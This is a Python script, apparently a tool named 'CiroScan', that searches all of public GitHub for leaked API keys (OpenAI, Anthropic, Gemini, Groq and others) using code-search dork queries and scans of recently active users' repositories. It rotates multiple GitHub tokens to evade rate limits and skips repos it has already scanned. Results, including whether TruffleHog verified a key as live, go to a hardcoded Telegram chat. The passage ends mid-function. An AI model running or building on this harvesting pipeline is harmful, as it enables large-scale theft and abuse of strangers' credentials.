import sys
import os
import json
import re
import time
import random
import shutil
import subprocess
import tempfile
import html
import urllib.request
import urllib.parse
try:
    import requests
except ImportError:
    import urllib.request as _url_req
    import urllib.parse as _url_parse
    import urllib.error as _url_err
    import json as _json

    class _CaseInsensitiveDict(dict):
        def __init__(self, data=None):
            super().__init__()
            if data:
                for k, v in data.items():
                    self[k] = v
        def __setitem__(self, key, value):
            super().__setitem__(key.lower(), value)
        def __getitem__(self, key):
            return super().__getitem__(key.lower())
        def get(self, key, default=None):
            return super().get(key.lower(), default)
        def __contains__(self, key):
            return super().__contains__(key.lower())

    class _ResponseShim:
        def __init__(self, code, content, headers=None):
            self.status_code = code
            self.content = content
            self.text = content.decode("utf-8", errors="replace")
            self.headers = _CaseInsensitiveDict(headers or {})
            self.ok = 200 <= code < 300
        def json(self):
            return _json.loads(self.text)
        def raise_for_status(self):
            if 400 <= self.status_code < 600:
                raise _url_err.HTTPError(None, self.status_code, f"HTTP Error {self.status_code}: {self.text[:200]}", self.headers, None)

    class _RequestsShim:
        @staticmethod
        def get(url, headers=None, params=None, timeout=30, **kwargs):
            if params:
                query_str = _url_parse.urlencode(params)
                url = f"{url}?{query_str}" if "?" not in url else f"{url}&{query_str}"
            req = _url_req.Request(url, headers=headers or {})
            try:
                with _url_req.urlopen(req, timeout=timeout) as resp:
                    resp_headers = {k: v for k, v in resp.info().items()}
                    return _ResponseShim(resp.getcode(), resp.read(), resp_headers)
            except _url_err.HTTPError as e:
                resp_headers = {k: v for k, v in e.info().items()} if e.info() else {}
                return _ResponseShim(e.code, e.read(), resp_headers)

        @staticmethod
        def post(url, data=None, json=None, headers=None, files=None, params=None, timeout=30, **kwargs):
            if params:
                query_str = _url_parse.urlencode(params)
                url = f"{url}?{query_str}" if "?" not in url else f"{url}&{query_str}"
            hdrs = dict(headers or {})
            body = None
            if json is not None:
                body = _json.dumps(json).encode("utf-8")
                hdrs["Content-Type"] = "application/json"
            elif files is not None:
                boundary = "----WebKitFormBoundary" + hex(int(time.time() * 1000))[2:]
                hdrs["Content-Type"] = f"multipart/form-data; boundary={boundary}"
                lines = []
                if data:
                    for k, v in data.items():
                        lines.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n".encode("utf-8"))
                for k, fobj in files.items():
                    fname = os.path.basename(getattr(fobj, "name", "file"))
                    fcontent = fobj.read() if hasattr(fobj, "read") else fobj
                    lines.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"; filename=\"{fname}\"\r\nContent-Type: application/octet-stream\r\n\r\n".encode("utf-8"))
                    lines.append(fcontent + b"\r\n")
                lines.append(f"--{boundary}--\r\n".encode("utf-8"))
                body = b"".join(lines)
            elif data is not None:
                body = _url_parse.urlencode(data).encode("utf-8")
                hdrs["Content-Type"] = "application/x-www-form-urlencoded"

            req = _url_req.Request(url, data=body, headers=hdrs, method="POST")
            try:
                with _url_req.urlopen(req, timeout=timeout) as resp:
                    resp_headers = {k: v for k, v in resp.info().items()}
                    return _ResponseShim(resp.getcode(), resp.read(), resp_headers)
            except _url_err.HTTPError as e:
                resp_headers = {k: v for k, v in e.info().items()} if e.info() else {}
                return _ResponseShim(e.code, e.read(), resp_headers)

        @staticmethod
        def put(url, data=None, json=None, headers=None, timeout=30, **kwargs):
            hdrs = dict(headers or {})
            body = None
            if json is not None:
                body = _json.dumps(json).encode("utf-8")
                hdrs["Content-Type"] = "application/json"
            req = _url_req.Request(url, data=body, headers=hdrs, method="PUT")
            try:
                with _url_req.urlopen(req, timeout=timeout) as resp:
                    resp_headers = {k: v for k, v in resp.info().items()}
                    return _ResponseShim(resp.getcode(), resp.read(), resp_headers)
            except _url_err.HTTPError as e:
                resp_headers = {k: v for k, v in e.info().items()} if e.info() else {}
                return _ResponseShim(e.code, e.read(), resp_headers)

    requests = _RequestsShim()
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGET_INPUT = sys.argv[1] if len(sys.argv) > 1 else os.getenv("TARGET_URL", "")

# === [BARU] === Mode feed: aktif kalau target = "feed", argumen --feed, atau env FEED_MODE
FEED_MODE = (
    TARGET_INPUT.strip().lower() in ("feed", "auto", "@feed")
    or "--feed" in sys.argv
    or os.getenv("FEED_MODE", "").strip().lower() in ("1", "true", "yes")
)
# === [BARU] === Konfigurasi feed (semua via env supaya bisa diatur di workflow)
FEED_EVENT_PAGES = int(os.getenv("FEED_EVENT_PAGES", "2"))
FEED_MAX_USERS = int(os.getenv("FEED_MAX_USERS", "50"))
FEED_MAX_REPOS_PER_USER = int(os.getenv("FEED_MAX_REPOS_PER_USER", "3"))
FEED_MAX_TOTAL_REPOS = int(os.getenv("FEED_MAX_TOTAL_REPOS", "150"))
REPO_SCAN_TIMEOUT = int(os.getenv("REPO_SCAN_TIMEOUT", "90"))
CONCURRENCY_WORKERS = int(os.getenv("CONCURRENCY_WORKERS", "3"))
FEED_FETCH_WORKERS = int(os.getenv("FEED_FETCH_WORKERS", "12"))

# === [SHARD] === Mode workflow matrix: collect-only / shard-scan / merge-only
COLLECT_ONLY = os.getenv("COLLECT_ONLY", "").strip().lower() in ("1", "true", "yes")
MERGE_ONLY = os.getenv("MERGE_ONLY", "").strip().lower() in ("1", "true", "yes")
SHARD_INDEX = int(os.getenv("SHARD_INDEX", "-1"))   # -1 = bukan mode shard
SHARD_TOTAL = int(os.getenv("SHARD_TOTAL", "1"))
TARGETS_FILE = os.getenv("TARGETS_FILE", "targets.json")
FEED_EXCLUDE = {u.strip().lower() for u in os.getenv("FEED_EXCLUDE", "").split(",") if u.strip()}

# === [DORK] === Mode dork global: aktif kalau target = "dork", argumen --dork, atau env DORK_MODE
DORK_MODE = (
    TARGET_INPUT.strip().lower() in ("dork", "@dork")
    or "--dork" in sys.argv
    or os.getenv("DORK_MODE", "").strip().lower() in ("1", "true", "yes")
)
# === [DORK] === Konfigurasi dork
# List query dipisahkan dengan karakter '|' (pipe), contoh:
#   DORK_QUERIES: "filename:.npmrc _authToken|filename:.env AWS_SECRET_ACCESS_KEY"
DORK_QUERIES_RAW = os.getenv("DORK_QUERIES", "").strip()
DORK_QUERIES_PER_RUN = int(os.getenv("DORK_QUERIES_PER_RUN", "5"))
DORK_MAX_REPOS = int(os.getenv("DORK_MAX_REPOS", "50"))
DORK_MAX_REPO_SIZE_KB = int(os.getenv("DORK_MAX_REPO_SIZE_KB", "200000"))  # skip repo raksasa (clone lama)
DORK_QUERY_WORKERS = int(os.getenv("DORK_QUERY_WORKERS", "6"))
# Query default kalau env tidak diisi — set aman & terbukti produktif
DORK_DEFAULT_QUERIES = [
    # === 1. OPENAI ENTERPRISE (sk-proj-) ===
    "filename:.env OPENAI_API_KEY sk-proj-",
    "filename:docker-compose.yml OPENAI_API_KEY",
    "filename:.env.production OPENAI_API_KEY",

    # === 2. ANTHROPIC CLAUDE PRODUCTION (sk-ant-) ===
    "filename:.env ANTHROPIC_API_KEY sk-ant",
    "filename:docker-compose.yml ANTHROPIC_API_KEY",
    "filename:.env.production ANTHROPIC_API_KEY",

    # === 3. DEEPSEEK (sk-) ===
    "filename:.env DEEPSEEK_API_KEY sk-",
    "filename:docker-compose.yml DEEPSEEK_API_KEY",

    # === 4. MCP CONFIG LEAKS (Cursor & AI Tools) ===
    "filename:mcp.json api_key",
    "filename:mcp.json OPENAI_API_KEY",
    "filename:mcp.json ANTHROPIC_API_KEY",

    # === 5. AZURE OPENAI ENTERPRISE ===
    "filename:values.yaml azureOpenAIApiKey",
    "filename:docker-compose.yml AZURE_OPENAI_API_KEY",
    "filename:.env AZURE_OPENAI_API_KEY",

    # === 6. GOOGLE GEMINI AI STUDIO ===
    "filename:.env GEMINI_API_KEY AIzaSy",
    "filename:.env GOOGLE_API_KEY AIzaSy",

    # === 7. GROQ / FAST INFERENCE (gsk_) ===
    "filename:.env GROQ_API_KEY gsk_",
    "filename:docker-compose.yml GROQ_API_KEY",

    # === 8. VOICE AI & PERPLEXITY ===
    "filename:.env ELEVENLABS_API_KEY",
    "filename:.env DEEPGRAM_API_KEY",
    "filename:.env PERPLEXITY_API_KEY pplx-",
]


def _parse_search_keyword():
    """Ambil kata kunci pencarian teks bebas dari CLI (--search / -bebas) atau env."""
    # === [DORK] === filter flag --feed DAN --dork
    args = [a for a in sys.argv[2:] if a not in ("--feed", "--dork")]
    for i, a in enumerate(args):
        if a in ("--search", "-bebas") and i + 1 < len(args):
            return args[i + 1].strip()
        if a.startswith("--search="):
            return a[len("--search="):].strip()
        if a.startswith("-bebas="):
            return a[len("-bebas="):].strip()
    return (os.getenv("SEARCH_KEYWORD", "") or "").strip()

SEARCH_KEYWORD = _parse_search_keyword()
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "1936436999")
GH_PATS_RAW = os.getenv("GH_PAT", "")
GH_PATS = [p.strip() for p in GH_PATS_RAW.split(",") if p.strip()]
for env_k in ["GH_PAT_1", "GH_PAT_2", "GH_PAT_3"]:
    val = os.getenv(env_k, "").strip()
    if val and val not in GH_PATS:
        GH_PATS.append(val)

_pat_index = 0
def get_next_gh_token():
    global _pat_index
    if not GH_PATS:
        return ""
    tok = GH_PATS[_pat_index % len(GH_PATS)]
    _pat_index += 1
    return tok

GH_PAT = GH_PATS[0] if GH_PATS else ""

# === [DORK] === Helper API GitHub dengan rate-limit & multi-token rotation
def _gh_api_get(url, retries=None):
    if retries is None:
        retries = max(2, len(GH_PATS))
    headers = {"User-Agent": "CiroScan-BatchEngine", "Accept": "application/vnd.github+json"}
    for attempt in range(retries + 1):
        tok = get_next_gh_token()
        if tok:
            headers["Authorization"] = f"Bearer {tok}"
        try:
            resp = requests.get(url, headers=headers, timeout=20)
            if resp.status_code in (401, 403, 429) and attempt < retries:
                if len(GH_PATS) > 1:
                    print(f"🔄 Token GitHub kena {resp.status_code}, rotasi otomatis ke token berikutnya ({attempt+1}/{retries})...")
                    time.sleep(2)
                    continue
                reset = int(resp.headers.get("X-RateLimit-Reset", "0") or 0)
                wait = min(max(reset - time.time() + 2, 5), 180)
                print(f"⏳ Rate limit kena, jeda {int(wait)}s lalu retry...")
                time.sleep(wait)
                continue
            resp.raise_for_status()
            return resp.json()
        except Exception as e:
            if attempt < retries:
                time.sleep(2)
                continue
            print(f"⚠️ API gagal ({url}): {e}")
            return None
    return None

# === [DORK] ================================================================
# MODE DORK GLOBAL: pakai GitHub Code Search API untuk menemukan repo yang berisi
# file sensitif (.env, id_rsa, dll.) di SELURUH GitHub publik — bukan cuma yang
# aktif di feed. Hasilnya langsung diserahkan ke pipeline TruffleHog yang ada.
# ===========================================================================
def _gh_code_search(query, retries=None, page=None):
    """Satu query code search dengan random page & retry. Return list item hasil."""
    if not GH_PATS:
        print("❌ Mode DORK WAJIB pakai GH_PAT (code search tidak bisa anonymous).")
        return None
    if retries is None:
        retries = max(2, len(GH_PATS))
    headers = {
        "User-Agent": "CiroScan-BatchEngine",
        "Accept": "application/vnd.github.text-match+json",
    }
    
    # Acak halaman 1 sampai 5 agar hasil search bervariasi dan menyapu repo baru tiap run
    target_page = page if page is not None else random.randint(1, 5)
    params = {"q": query, "per_page": 100, "page": target_page}
    for attempt in range(retries + 1):
        tok = get_next_gh_token()
        if tok:
            headers["Authorization"] = f"Bearer {tok}"
        try:
            resp = requests.get("https://api.github.com/search/code",
                                headers=headers, params=params, timeout=25)
            if resp.status_code in (401, 403, 429) and attempt < retries:
                if len(GH_PATS) > 1:
                    print(f"🔄 Code search token kena {resp.status_code}, rotasi otomatis ke token berikutnya ({attempt+1}/{retries})...")
                    time.sleep(2)
                    continue
                reset = int(resp.headers.get("X-RateLimit-Reset", "0") or 0)
                wait = min(max(reset - time.time() + 2, 7), 90)
                print(f"⏳ Search rate limit kena untuk query ini, jeda {int(wait)}s...")
                time.sleep(wait)
                continue
            resp.raise_for_status()
            return resp.json().get("items", [])
        except Exception as e:
            if attempt < retries:
                time.sleep(3)
                continue
            print(f"⚠️ Code search gagal ({query!r}): {e}")
            return None
    return None

_PLACEHOLDER_SNIPPET = re.compile(
    r"(changeme|change_me|change-me|example|placeholder|xxx+|your[_-]?key|"
    r"your[_-]?password|dummy|sample|test[_-]?key|insert[_-]?key|todo)", re.I)

def _dork_item_useful(item):
    """Filter kasar hasil search: buang fork, node_modules, template placeholder."""
    repo = item.get("repository") or {}
    if repo.get("fork"):
        return False
    if repo.get("size", 0) > DORK_MAX_REPO_SIZE_KB:
        return False
    fpath = item.get("path") or ""
    if "node_modules/" in fpath or "vendor/" in fpath or fpath.lower().startswith("test"):
        return False
    # Cek snippet text-match: kalau semua match-nya placeholder, skip
    tms = item.get("text_matches") or []
    if tms:
        joined = " ".join(t.get("fragment", "") for t in tms)
        if _PLACEHOLDER_SNIPPET.search(joined):
            return False
    return True


# === [CACHE / HISTORY PERSISTENCE] =========================================
# Menyimpan riwayat repo & user yang pernah discan di GitHub branch 'state'
# agar scan selanjutnya tidak mengulang repo atau user yang sama (100% fresh).
# ===========================================================================
CACHE_BRANCH = "state"
CACHE_FILE = "scanned_history.json"

def _load_scanned_history():
    """Baca set repo & user yang sudah pernah discan dari remote branch 'state'."""
    scanned_repos = set()
    scanned_users = set()
    sha = None
    if not GH_PAT:
        return scanned_repos, scanned_users, sha
    
    owner = os.getenv("GITHUB_REPOSITORY_OWNER") or "ciroxtreme"
    repo_name = (os.getenv("GITHUB_REPOSITORY") or "ciroxtreme/ciro-scan").split("/")[-1]
    url = f"https://api.github.com/repos/{owner}/{repo_name}/contents/{CACHE_FILE}?ref={CACHE_BRANCH}"
    headers = {
        "Authorization": f"Bearer {GH_PAT}",
        "Accept": "application/vnd.github.v3+json",
        "User-Agent": "CiroScan-CacheEngine"
    }
    try:
        resp = requests.get(url, headers=headers, timeout=15)
        if resp.status_code == 200:
            import base64
            data = resp.json()
            sha = data.get("sha")
            raw_content = base64.b64decode(data.get("content", "")).decode("utf-8")
            hist = json.loads(raw_content)
            scanned_repos = set(hist.get("repos", []))
            scanned_users = set(hist.get("users", []))
            print(f"📦 Riwayat Cache Termuat: {len(scanned_repos)} repo & {len(scanned_users)} user pernah discan.")
    except Exception as e:
        print(f"ℹ️ Info Cache: Memulai cache riwayat baru ({e}).")
    return scanned_repos, scanned_users, sha

def _save_scanned_history(new_scanned_repos, new_scanned_users):
    """Simpan akumulasi repo & user yang discan ke remote branch 'state'."""
    if not GH_PAT or (not new_scanned_repos and not new_scanned_users):
        return
    import base64
    owner = os.getenv("GITHUB_REPOSITORY_OWNER") or "ciroxtreme"
    repo_name = (os.getenv("GITHUB_REPOSITORY") or "ciroxtreme/ciro-scan").split("/")[-1]
    
    existing_repos, existing_users, latest_sha = _load_scanned_history()
    all_repos = sorted(list(existing_repos.union(new_scanned_repos)))
    all_users = sorted(list(existing_users.union(new_scanned_users)))
    
    if len(all_repos) > 10000:
        all_repos = all_repos[-10000:]
    if len(all_users) > 5000:
        all_users = all_users[-5000:]

    payload_data = json.dumps({"repos": all_repos, "users": all_users}, indent=2)
    b64_content = base64.b64encode(payload_data.encode("utf-8")).decode("utf-8")
    
    headers = {
        "Authorization": f"Bearer {GH_PAT}",
        "Accept": "application/vnd.github.v3+json",
        "User-Agent": "CiroScan-CacheEngine"
    }
    url = f"https://api.github.com/repos/{owner}/{repo_name}/contents/{CACHE_FILE}"
    body = {
        "message": f"chore(cache): update scanned history (+{len(new_scanned_repos)} repos)",
        "content": b64_content,
        "branch": CACHE_BRANCH
    }
    if latest_sha:
        body["sha"] = latest_sha
    try:
        r = requests.put(url, headers=headers, json=body, timeout=20)
        if r.status_code in (200, 201):
            print(f"💾 Sukses simpan riwayat cache ke branch '{CACHE_BRANCH}'! (Total: {len(all_repos)} repo).")
        else:
            print(f"⚠️ Gagal update cache state ({r.status_code}): {r.text[:120]}")
    except Exception as e:
        print(f"⚠️ Gagal update cache branch: {e}")

def collect_targets_from_dork():
    """Return (targets, dork_detail). dork_detail = info query → jml hasil."""
    queries = [q.strip() for q in DORK_QUERIES_RAW.split("|") if q.strip()] \
              if DORK_QUERIES_RAW else list(DORK_DEFAULT_QUERIES)
    if not queries:
        print("❌ Tidak ada query dork tersedia.")
        return [], []

    # Rotasi: ambil sebagian query secara acak tiap run → jangkauan meluas antar-run
    n = min(DORK_QUERIES_PER_RUN, len(queries))
    picked_queries = random.sample(queries, n)
    print(f"🎣 DORK GLOBAL: {len(queries)} query di pool, {n} dipilih run ini:")
    for q in picked_queries:
        print(f"   • {q}")

    if not GH_PATS:
        send_telegram_text("❌ <b>Mode DORK gagal</b> — GH_PAT wajib diisi di secrets untuk code search.")
        return [], []

    repo_urls = []      # urutan penemuan (dipertahankan, jangan sorted)
    seen = set()
    
    # Ambil riwayat repo & user yang pernah discan sebelumnya dari cache
    history_repos, history_users, _ = _load_scanned_history()
    seen.update(history_repos)

    # ASINKRON: semua query jalan PARALEL (query independen; rate limit
    # code search 30/menit, 3 query bersamaan masih jauh di bawah batas).
    results_by_query = {}
    with ThreadPoolExecutor(max_workers=min(n, DORK_QUERY_WORKERS)) as ex:
        fut2q = {ex.submit(_gh_code_search, q): q for q in picked_queries}
        for fut in as_completed(fut2q):
            results_by_query[fut2q[fut]] = fut.result()

    per_query_candidates = []
    error_queries = set()
    skipped_history_count = 0
    for query in picked_queries:
        items = results_by_query.get(query)
        if items is None:
            error_queries.add(query)
            continue
        cands = []
        for item in items:
            if not _dork_item_useful(item):
                continue
            full_name = (item.get("repository") or {}).get("full_name")
            if not full_name:
                continue
            owner_user = full_name.split("/")[0] if "/" in full_name else ""
            if full_name in seen or (owner_user and owner_user in history_users):
                skipped_history_count += 1
                continue
            seen.add(full_name)   # dedup global
            cands.append(full_name)
        per_query_candidates.append((query, cands))
    
    if skipped_history_count > 0:
        print(f"🛡️ Cache Filter: Berhasil memblokir {skipped_history_count} repo/user yang sudah pernah discan sebelumnya!")

    found_by_query = {q: 0 for q, _ in per_query_candidates}
    round_idx = 0
    while len(repo_urls) < DORK_MAX_REPOS:
        progressed = False
        for query, cands in per_query_candidates:
            if len(repo_urls) >= DORK_MAX_REPOS:
                break
            if round_idx < len(cands):
                repo_urls.append(f"https://github.com/{cands[round_idx]}")
                found_by_query[query] += 1
                progressed = True
        round_idx += 1
        if not progressed:
            break

    dork_detail = []
    for qi, query in enumerate(picked_queries, 1):
        if query in error_queries:
            dork_detail.append({"query": query, "found": 0, "error": True})
            continue
        found = found_by_query.get(query, 0)
        dork_detail.append({"query": query, "found": found})
        print(f"   → [{qi}/{n}] {found} repo kandidat dari: {query}")
    if len(repo_urls) >= DORK_MAX_REPOS:
        print(f"   🛑 Plafon {DORK_MAX_REPOS} repo tercapai (bagi rata {n} query).")

    repo_urls = repo_urls[:DORK_MAX_REPOS]
    if repo_urls:
        print(f"✅ Total {len(repo_urls)} repo target dari dork: "
              f"{', '.join(u.split('/')[-1] for u in repo_urls[:10])}{'…' if len(repo_urls) > 10 else ''}")
    return repo_urls, dork_detail
# === [SELESAI DORK] =======================================================

def send_telegram_text(text):
    if not TELEGRAM_BOT_TOKEN:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    try:
        requests.post(url, json=payload, timeout=15)
    except Exception as e:
        print(f"[ERR] Send text failed: {e}")

def send_telegram_document(file_path, caption=""):
    if not TELEGRAM_BOT_TOKEN or not os.path.exists(file_path):
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, "rb") as f:
            requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption}, files={"document": f}, timeout=35)
        print(f"✅ Document sent: {file_path}")
    except Exception as e:
        print(f"[ERR] Send document failed: {e}")

# --- Pemisah temuan: aktif / potensial / noise (aturan sama seperti split.py) ---
PLACEHOLDER_HOSTS = {
    "example.com", "www.example.com", "example.org", "example.net",
    "proxy", "host", "localhost", "127.0.0.1",
    "captchatest.book.bi", "y.ep",
}

def _uri_host(redacted):
    m = re.search(r"@([^/:?#]+)", redacted or "")
    return (m.group(1).lower() if m else "")

def _is_placeholder_uri(redacted):
    host = _uri_host(redacted)
    if not host:
        return True
    if host in PLACEHOLDER_HOSTS:
        return True
    return host.endswith((".example.com", ".example.org", ".example.net",
                          ".test", ".invalid", ".localhost"))

def classify_finding(data):
    """Kembalikan (bucket, reason): active / potential / noise."""
    det = data.get("DetectorName") or data.get("DetectorType") or "?"
    verified = data.get("Verified")
    if verified is True:
        return "active", "Verified live oleh TruffleHog (API layanan asli dikontak)"
    meta = (data.get("SourceMetadata") or {}).get("Data") or {}
    git = meta.get("Git") or meta.get("Github") or {}
    fpath = git.get("file") or ""
    redacted = (data.get("Redacted") or data.get("Raw") or data.get("RawV2") or "").replace("\n", " ").strip()
    if det == "Box":
        return "noise", "Box detector false positive"
    if "vendor/" in fpath or "node_modules/" in fpath:
        return "noise", "Dependency vendor / node_modules (bukan kode sendiri)"
    if det == "PrivateKey" and "boringssl" in fpath:
        return "noise", "Kunci test BoringSSL"
    if det == "URI" and _is_placeholder_uri(redacted):
        return "noise", "URI contoh/placeholder (example.com, user:pass@host, domain test)"
    return "potential", "Belum terverifikasi tapi bentuknya kunci asli (lama/session/kredensial)"

def safe_record(data, bucket, reason):
    """Satu baris temuan AMAN (tanpa Raw/RawV2) untuk file JSON pisah."""
    meta = (data.get("SourceMetadata") or {}).get("Data") or {}
    git = meta.get("Git") or meta.get("Github") or {}
    return {
        "detector": data.get("DetectorName") or data.get("DetectorType") or "?",
        "verified": bool(data.get("Verified")) if data.get("Verified") is not None else None,
        "category": bucket,
        "reason": reason,
        "repo": data.get("_scanned_repo", ""),
        "file": git.get("file") or "",
        "line": git.get("line") or "",
        "commit": (git.get("commit") or "")[:12],
        "redacted": (data.get("Redacted") or data.get("Raw") or data.get("RawV2") or "").replace("\n", " ").strip(),
    }

# === [BARU] ================================================================
# MODE FEED GLOBAL: sedot user + repo yang baru saja aktif di GitHub publik,
# lalu jadikan target batch scan otomatis.
# ===========================================================================
def collect_targets_from_feed():
    users_seen = {}   # login -> repo pertama yang ia sentuh (paling fresh)

    print(f"📡 FEED GLOBAL: menyedot {FEED_EVENT_PAGES} halaman event publik GitHub...")
    for page in range(1, FEED_EVENT_PAGES + 1):
        events = _gh_api_get(f"https://api.github.com/events?per_page=100&page={page}")
        if not events:
            print(f"⚠️ Halaman {page}: tidak ada data event / gagal fetch.")
            break
        for ev in events:
            if ev.get("type") not in ("PushEvent", "PullRequestEvent", "IssuesEvent",
                                       "IssueCommentEvent", "CreateEvent", "ReleaseEvent"):
                continue
            actor = (ev.get("actor") or {}).get("login")
            repo = (ev.get("repo") or {}).get("name")
            if not actor or not repo:
                continue
            if "[bot]" in actor.lower() or actor.lower() in FEED_EXCLUDE:
                continue
            if actor not in users_seen:
                users_seen[actor] = repo
        time.sleep(1)

    if not users_seen:
        print("❌ Feed kosong — tidak ada user yang bisa dipicked.")
        return [], []

    # JANGAN di-sorted: urutan dict = urutan pertama ketemu di feed (event terbaru dulu)
    if FEED_MAX_USERS <= 0 or FEED_MAX_USERS >= len(users_seen):
        picked_users = list(users_seen.keys())
    else:
        picked_users = list(users_seen.keys())[:FEED_MAX_USERS]
    print(f"🎯 {len(users_seen)} user aktif terdeteksi, dipicked {len(picked_users)} user: "
          f"{', '.join(picked_users)}")

    targets, feed_detail = [], []
    detail_by_user = {}
    for u in picked_users:
        targets.append(f"https://github.com/{users_seen[u]}")
        entry = {"user": u, "repos": [users_seen[u]], "source": "feed (baru aktif)"}
        feed_detail.append(entry)
        detail_by_user[u] = entry

    if FEED_MAX_REPOS_PER_USER > 1:
        # ASINKRON (quick win): fetch daftar repo tiap user jalan PARALEL.
        # requests.get thread-safe; ex.map menjaga urutan sesuai picked_users,
        # jadi hasil & urutan target IDENTIK dengan versi sekuensial — cuma lebih cepat.
        def _fetch_user_repos(u):
            return _gh_api_get(f"https://api.github.com/users/{u}/repos?per_page=100&sort=pushed&type=owner")
        with ThreadPoolExecutor(max_workers=min(len(picked_users), FEED_FETCH_WORKERS)) as ex:
            fetched = dict(zip(picked_users, ex.map(_fetch_user_repos, picked_users)))
        for u in picked_users:
            if len(targets) >= FEED_MAX_TOTAL_REPOS:
                break
            repos = fetched.get(u)
            if not repos:
                continue
            added = 0
            for r in repos:
                if added >= FEED_MAX_REPOS_PER_USER - 1 or len(targets) >= FEED_MAX_TOTAL_REPOS:
                    break
                if r.get("fork") or r.get("private") or r.get("size", 0) == 0:
                    continue
                url = r.get("html_url")
                if url and url not in targets:
                    targets.append(url)
                    detail_by_user[u]["repos"].append(url)
                    added += 1

    seen, final = set(), []
    for t in targets:
        if t not in seen:
            seen.add(t)
            final.append(t)
    final = final[:FEED_MAX_TOTAL_REPOS]

    print(f"✅ Total {len(final)} repo target dari feed: {', '.join(t.split('/')[-1] for t in final)}")
    return final, feed_detail
# === [SELESAI BARU] =======================================================

def resolve_target_repos(target_str):
    """
    Mendeteksi apakah target berupa:
    1. Single Repo (misal: https://github.com/ciroxtreme/cdtt)
    2. Akun/Organisasi (misal: https://github.com/ciroxtreme atau ciroxtreme)
    """
    clean = target_str.strip().rstrip("/")
    m_repo = re.match(r"^https?://github\.com/([^/]+)/([^/]+)/?$", clean)
    if m_repo:
        return [f"https://github.com/{m_repo.group(1)}/{m_repo.group(2)}"]

    m_user = re.match(r"^(?:https?://github\.com/)?@?([^/]+)/?$", clean)
    if m_user:
        owner = m_user.group(1)
        print(f"🌐 Mendeteksi target sebagai AKUN PENGGUNA/ORGANISASI: {owner}")
        api_url = f"https://api.github.com/users/{owner}/repos?per_page=100&type=public"
        urls = []
        try:
            page = 1
            while True:
                repos_data = _gh_api_get(f"{api_url}&page={page}")
                if not repos_data:
                    break
                urls.extend(r["html_url"] for r in repos_data if not r.get("fork"))
                if len(repos_data) < 100:
                    break
                page += 1
            print(f"✅ Ditemukan {len(urls)} repositori publik untuk akun '{owner}'")
            return urls
        except Exception as e:
            print(f"⚠️ Gagal mengambil daftar repo akun {owner}: {e}")
            return [clean]

    return [clean]

# --- Pencarian teks bebas (-bebas): cari kata apa saja di seluruh history git ---
MAX_MATCHES_PER_REPO = 100
MAX_TOTAL_MATCHES = 500
MAX_COMMITS_PER_REPO = 20

def _search_category(fpath):
    """Klasifikasi kecocokan teks: vendor/node_modules = noise, sisanya potential."""
    if "vendor/" in fpath or "node_modules/" in fpath:
        return "noise", "Kecocokan di dependency vendor / node_modules"
    return "potential", "Kecocokan di kode sendiri"

def search_text_in_repo(repo_url, keyword, repo_name):
    """Clone repo lalu cari keyword (case-insensitive) di seluruh history.
    Kembalikan (matches, error). matches = list dict {repo,file,line,commit,content,category,reason}."""
    tmpdir = tempfile.mkdtemp(prefix="ciroscan-search-")
    try:
        clone = subprocess.run(
            ["git", "clone", "--quiet", repo_url, tmpdir],
            capture_output=True, text=True, timeout=600)
        if clone.returncode != 0:
            err = (clone.stderr or "").strip()[-300:]
            return [], f"git clone gagal: {err}"
        pattern = re.escape(keyword)
        log = subprocess.run(
            ["git", "-C", tmpdir, "log", "--all", "--pretty=format:%H", "-i", "-G", pattern],
            capture_output=True, text=True, timeout=300)
        if log.returncode != 0:
            return [], f"git log gagal: {(log.stderr or '').strip()[-200:]}"
        commits = [c.strip() for c in log.stdout.splitlines() if c.strip()][:MAX_COMMITS_PER_REPO]
        matches = []
        seen = set()
        for commit in commits:
            if len(matches) >= MAX_MATCHES_PER_REPO:
                break
            grep = subprocess.run(
                ["git", "-C", tmpdir, "grep", "-n", "-i", "-F", "-e", keyword, commit, "--"],
                capture_output=True, text=True, timeout=120)
            if grep.returncode != 0:
                continue
            for line in grep.stdout.splitlines():
                m = re.match(r"^([0-9a-f]{40}):(.+):(\d+):(.*)$", line)
                if not m:
                    continue
                _, fpath, lineno, content = m.groups()
                key = (fpath, lineno, content.strip())
                if key in seen:
                    continue
                seen.add(key)
                category, reason = _search_category(fpath)
                matches.append({
                    "repo": repo_name,
                    "file": fpath,
                    "line": int(lineno),
                    "commit": commit[:12],
                    "content": content.strip()[:200],
                    "category": category,
                    "reason": reason,
                })
                if len(matches) >= MAX_MATCHES_PER_REPO:
                    break
        return matches, ""
    except subprocess.TimeoutExpired:
        return [], "timeout saat clone/search (repo terlalu besar?)"
    except OSError as e:
        return [], f"gagal menjalankan git: {e}"
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

def run_text_search(targets, keyword, target_label="", suffix="", quiet=False):
    """Mode -bebas: cari keyword di semua repo target, laporkan ke Telegram."""
    total_targets = len(targets)
    is_batch = total_targets > 1
    if not quiet:
        send_telegram_text(
            f"🔍 <b>PENCARIAN TEKS BEBAS DIMULAI!</b>\n\n🔎 <b>Kata kunci:</b> <code>{html.escape(keyword)}</code>\n"
            f"🎯 <b>Target:</b> <code>{target_label or TARGET_INPUT}</code>\n📦 <b>Total Repositori:</b> <b>{total_targets} repo</b>\n"
            f"⏳ <i>Sedang menyisir seluruh history commit...</i>")

    all_matches = []
    failed_repos = []
    repo_summaries = []
    for idx, repo_url in enumerate(targets, 1):
        repo_name = "/".join(repo_url.rstrip("/").split("/")[-2:])
        print(f"[{idx}/{total_targets}] Searching '{keyword}' in {repo_name} ({repo_url})...")
        matches, err = search_text_in_repo(repo_url, keyword, repo_name)
        if err:
            print(f"❌ Search GAGAL untuk {repo_name}: {err}")
            failed_repos.append({"repo": repo_name, "url": repo_url, "error": err})
            repo_summaries.append({"repo": repo_name, "matches": 0, "failed": True})
            continue
        all_matches.extend(matches)
